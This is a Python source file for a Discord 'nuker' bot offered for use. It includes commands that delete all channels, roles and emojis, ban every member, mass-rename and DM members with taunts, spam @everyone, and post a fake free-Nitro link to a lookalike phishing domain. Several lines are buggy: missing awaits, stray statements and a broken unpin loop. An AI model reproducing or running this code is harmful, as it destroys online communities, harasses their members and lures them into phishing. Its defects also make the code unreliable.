# import what's needed for the Nuker
import os
import discord
from discord.ext import commands
import time
from colorama import Fore
import asyncio
import json

print("Nuker Bot".center(63, "-"))
# Get the token
TOKEN = os.environ['TOKEN']

# sets prefix and intents to @bot.whatever

intents = discord.Intents(messages=True, guilds=True, members=True)


@commands.command()
@commands.guild_only()
async def setprefix(self, ctx, *, prefixes=""):

    custom_prefixes[ctx.guild.id] = prefixes.split() or default_prefixes
    await ctx.send("Prefix set!")


custom_prefixes = {}

default_prefixes = ['.']


async def prefix(bot, message):
    guild = message.guild
    # only allow custom prefixs in that one guild
    if guild:
        return custom_prefixes.get(guild.id, default_prefixes)
    else:
        return default_prefixes


bot = commands.Bot(command_prefix=prefix, intents=intents)

# remove a terrible help command. THANK YOU FOR NOTHING REPLIT!!!! <33

bot.remove_command('help')

# print 'Time to play!' when the bot is online and has connected to discord


@bot.event
async def on_ready():
    print('Time to play!')

    # set the bots presence

    activity = discord.Game("destroy the server!")
    await bot.change_presence(status=discord.Status.online, activity=activity)

    @bot.event
    async def on_server_join(server):
        print("Joined {0}!".format(server.name))


# stop command for emergencies


@bot.command()
@commands.is_owner()
async def shutdown(ctx):
    await ctx.message.delete()
    await ctx.bot.logout()
    print(Fore.GREEN + f"{bot.user.name} has logged out successfully." +
          Fore.RESET)


# bot command Nuck


@bot.command(pass_context=True)
async def nuck(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("NUKED LMFAO")
        await channel.send("GET NUKED")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{role.name} has been deleted")
        except:
            pass
    for member in list(bot.get_all_members()):
        try:
            await guild.ban(member)
            print("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted")
        except:
            pass
    print("\n \n Action completed: Nuck")


# renames everyone in the guild


@bot.command(pass_context=True)
async def renameall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(bot.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print(f"{member.name} has been renamed to {rename_to}")
        except:
            print(f"{member.name} has NOT been renamed")
        print(f"\n \n Action completed: Rename all")


# messsages everyone in the guild


@bot.command(pass_context=True)
async def DMall(ctx):
    await ctx.message.delete()
    for member in list(bot.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="Server Nucked",
                                  description="LMAOOO TRIGGERED",
                                  color=discord.Colour.blue())
            embed.set_thumbnail(
                url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Get nucked kid lol")
            await asyncio.sleep(2)

            # Delay so bot can't get rate-limited and banned automatically

            await member.send(embed=embed)
        except:
            pass
        print(f"\n \n Action completed: DM all")


# deletes all emojis in the guild


@bot.command(pass_context=True)
async def emojidel(ctx):
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted")
        except:
            pass
        print(f"\n \n Action completed: Emoji delete")


# help command


@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="Help",
        description=
        "**Nucker Commands:** \n .DMall (DM's everyone in the server) \n .emojidel (Delete all server emojis) \n .ping (Get bot ping) \n .renameall (Renames everyone in the server) \n .roledel (Deletes all roles)\n .slow (Sets the slowmode to 100 seconds) \n invite (Invite this bot to the server)\n .setprefix(Change the bot prefix for your guild!)\n**⚠️WARNING⚠️**\n .nuck (Nucks the server)\n .spam (Spams everyone) \n .nitro (Alert everyone for free nitro) \n .unpin (Unpins all messages in that channel) \n .purge (Deletes 500 messages at a time) \n**:octagonal_sign:EMERGENCY:octagonal_sign: ** \n .shutdown (Logs the bot out)",
        color=discord.Color.red())
    embed.set_footer(text="Thank you for using my bot <3")
    await ctx.send(embed=embed)
    print('\n \nAction complete: Help')


# ping command


@bot.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed = discord.Embed(title='Pong',
                          description='Ping: **{}**'.format(
                              round((t2 - t1) * 1000)),
                          color=discord.Color.blue())
    await ctx.send(embed=embed)
    print("\n \nAction complete: Server ping")


# spam @everyone with a .5 second cooldown


@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    for i in range(3):
        await ctx.send("@everyone NUCKED")
        await asyncio.sleep(0.5)
        Exception
        pass
        print('\n \nAction complete: Spam')


# spam a fake nitro link


@bot.command()
async def nitro(ctx):
    await ctx.message.delete()
    for i in range(10):
        await ctx.send(
            "@everyone FREE NITRO at \n http://discordstean.com/airdrop")
        asyncio.sleep(.5)
        Exception
        pass
        print('\n \nAction complete: Free Nitro')


# Role delete command


@bot.command(pass_context=True)
async def roledel(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{role.name} has been deleted")
        except:
            pass
            print('\n \nAction complete: Role Delete')


# purge command


@bot.command()
async def purge(ctx, maxdel=500):
    channel = ctx.message.channel
    await ctx.message.delete()
    await channel.purge(limit=maxdel, check=None, before=None)
    asyncio.sleep(.5)
    ctx.message.delete()
    return True
    print("\n \nAction Complete: Purge")


# unpin everything


@bot.command()
async def unpin(ctx, amount=100):
    await ctx.message.delete()
    channel = ctx.channel
    x = 1000
    amount = amount
    pins = await channel.pins()
    while x <= amount:
        for message in pins:
            await message.unpin()
        x += 1
        await ctx.send("I just unpinned everything in this channel!")
    print('\n \nAction complete: Unpin')


# set slowmode


@bot.command()
async def slow(ctx, slowmode=60):
    await ctx.message.delete()
    await ctx.channel.edit(slowmode_delay=slowmode)
    await ctx.send(f"Just set the slowmode to 60 seconds!")
    print("\n \nAction complete: Slowmode")


# invite bot


@bot.command()
async def invite(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title="Invite the bot!",
        description=
        "You can invite the bot by clicking [here](https://discord.com/api/oauth2/authorize?client_id=907367949520744498&permissions=8&scope=bot)!",
        color=discord.Color.green())
    await ctx.send(embed=embed)
    print('\n \nAction complete: Invite')


bot.run(TOKEN)
